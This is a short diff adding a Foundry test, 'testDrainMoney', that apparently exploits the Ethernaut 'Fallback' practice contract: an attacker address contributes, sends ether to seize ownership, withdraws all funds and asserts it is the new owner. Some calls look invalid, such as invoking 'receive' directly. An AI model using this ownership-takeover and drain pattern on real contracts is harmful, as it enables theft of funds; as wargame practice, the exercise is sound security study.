@@ -12,6 +12,23 @@ Fallback fally = deployContract.run();
     }
 
     function testDrainMoney() public{
+        //Arrange
+     for(int i= 1; i<3;i++){
+            address player = address(uint160(i));
+            vm.deal(player , 10 ether);
+            fally.contribute{value:0.0001 ether}();
+        }
+        // act
+address hacker = makeAddr("Saad");
+        vm.startPrank(hacker);
+        vm.deal(hacker,10 ether);
+        fally.contribute{value:0.0001 ether}();
+        fally.receive{value:2 ether}();
+        fally.withdraw();
+
+
+// assert
+assert(fally.owner == hacker);
         
     }
 }
